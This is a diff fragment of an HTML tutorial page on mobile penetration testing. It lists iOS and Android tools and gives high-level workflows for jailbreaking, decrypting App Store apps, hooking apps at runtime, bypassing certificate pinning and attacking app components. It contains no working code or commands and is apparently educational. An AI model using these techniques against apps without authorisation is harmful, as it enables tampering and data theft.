+                • <strong>Clutch:</strong> Decrypt App Store encrypted apps (requires jailbreak)<br>
+                • <strong>Hopper/Ghidra:</strong> Disassemble Mach-O binaries<br>
+                • <strong>Frida:</strong> Works on iOS too! (requires jailbreak)<br>
+                • <strong>Cycript:</strong> JavaScript/Objective-C hybrid console for runtime manipulation<br>
+                • <strong>Burp Suite:</strong> Same HTTPS interception as Android<br><br>
+                <strong>Key Differences:</strong><br>
+                • iOS apps are always encrypted by Apple (need jailbreak to decrypt)<br>
+                • No easy "decompile to source" (Objective-C/Swift → assembly only)<br>
+                • Sandbox is much stricter (harder to access other apps' data)<br>
+                • Jailbreaking required for most pentesting tools<br><br>
+                <strong>iOS Testing Workflow:</strong><br>
+                1. <strong>Jailbreak device:</strong> Use checkra1n, unc0ver, or Odyssey<br>
+                2. <strong>Install Frida:</strong> Same process as Android<br>
+                3. <strong>Decrypt IPA:</strong> Use Clutch or CrackerXI+<br>
+                4. <strong>Static analysis:</strong> class-dump for headers, Hopper for disassembly<br>
+                5. <strong>Dynamic analysis:</strong> Frida hooks, Cycript runtime manipulation<br>
+                6. <strong>Traffic interception:</strong> Burp Suite + certificate pinning bypass<br><br>
+                iOS pentesting is generally harder than Android due to Apple's restrictions, but the core vulnerabilities (hardcoded secrets, insecure crypto, logic flaws) are the same!</p>
+            </div>
+
+            <div class="metaphor-box">
+                <h4>🎉 You're Now a Mobile Security Expert!</h4>
+                <p>You've mastered the complete mobile pentesting toolkit:<br><br>
+                ✅ <strong>APKTool:</strong> Decompile, modify, recompile APKs<br>
+                ✅ <strong>Jadx:</strong> Decompile to readable Java code<br>
+                ✅ <strong>ADB:</strong> Complete control over Android devices<br>
+                ✅ <strong>MobSF:</strong> Automated security assessment<br>
+                ✅ <strong>Frida:</strong> Runtime manipulation and bypass techniques<br>
+                ✅ <strong>Drozer:</strong> Android-specific vulnerability discovery<br><br>
+                <strong>Your Mobile Pentesting Workflow:</strong><br>
+                1. <strong>Acquisition:</strong> Download APK (from device, store, or APK mirror)<br>
+                2. <strong>Static Analysis:</strong> Jadx (read code) + MobSF (auto-scan) + grep (search secrets)<br>
+                3. <strong>Dynamic Analysis:</strong> ADB (logs, data) + Frida (hooks) + Burp Suite (traffic)<br>
+                4. <strong>Exploitation:</strong> APKTool (modify & recompile) + Drozer (component attacks)<br>
+                5. <strong>Reporting:</strong> Document findings with severity, impact, PoC, remediation<br><br>
+                <strong>Practice Resources:</strong><br>
+                • <strong>InsecureBankv2:</strong> Intentionally vulnerable banking app<br>
+                • <strong>DVIA:</strong> Damn Vulnerable iOS App<br>
+                • <strong>OWASP MSTG:</strong> Mobile Security Testing Guide<br>
+                • <strong>HackerOne/Bugcrowd:</strong> Real bug bounties for mobile apps<br><br>
+                Mobile security is one of the fastest-growing fields in cybersecurity. With 5+ billion smartphones and countless apps, vulnerabilities are everywhere. Now go find them! 🚀📱</p>
+            </div>
+        </section>
 
         <!-- SECTION 3: IoT & Hardware Hacking -->
         <section id="iot-hardware" class="section">
@@ -969,7 +2995,6 @@ my-app.apk/
             <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
         </section>
 
-        <!-- SECTION 5: Advanced Wireless Techniques -->
         <section id="advanced-wireless" class="section">
             <h2 class="section-title">Advanced Wireless Techniques</h2>
             <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
